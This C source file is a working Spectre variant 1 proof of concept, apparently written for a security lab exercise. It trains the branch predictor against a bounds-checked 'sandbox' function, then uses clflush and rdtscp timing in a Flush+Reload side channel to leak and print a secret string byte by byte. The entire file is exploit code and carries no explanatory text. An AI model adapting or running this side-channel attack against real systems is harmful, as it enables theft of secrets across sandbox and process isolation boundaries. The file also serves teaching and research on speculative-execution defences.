#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
uint8_t temp = 0;
char *secret = "Some Secret Value";   
uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (100)
#define DELTA 1024

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x < buffer_size) {
     return buffer[x];
  } else {
     return 3;
  } 
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

static int scores[256];
void reloadSideChannelImproved() {
  int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  unsigned int junk = 0;
  for (i = 0; i < 256; i++) {
    addr = &array[i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD && i != 3)
      scores[i]++; /* if cache hit, add 1 for this value */
  } 
}

void spectreAttack(size_t larger_x) {
  int i;
  uint8_t s;
  volatile int z;
  for (i = 0; i < 256; i++)  {
    _mm_clflush(&array[i*4096 + DELTA]);
  }
  // Train the CPU to take the true branch inside victim().
  for (i = 0; i < 100; i++) {
    _mm_clflush(&buffer_size);
    for (z = 0; z < 100; z++) { }
    restrictedAccess(i % 10);  
  }
  // Flush buffer_size and array[] from the cache.
  _mm_clflush(&buffer_size);
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  // Ask victim() to return the secret in out-of-order execution.
  for (z = 0; z < 100; z++) { }
  s = restrictedAccess(larger_x);
  array[s*4096 + DELTA] += 88;
}

int main() {
  int i;
  uint8_t s;
  size_t larger_x = (size_t)(secret-(char*)buffer);
  for (int offset = 0; offset < 20; ++ offset) {
    for(i=0;i<256; i++) scores[i]=0; 
    for (i = 0; i < 500; i++) {
      flushSideChannel();
      spectreAttack(larger_x + offset);
      reloadSideChannelImproved();
    }
    int max = 0;
    for (i = 0; i < 256; i++){
     if(scores[max] < scores[i])  
       max = i;
    }
    /* printf("%02X", max); */
    printf("%c", max);
    /* if (offset % 10 == 0) { */
    /*   printf("\n"); */
    /* } */

  }
  printf("\n");
  return (0); 
}
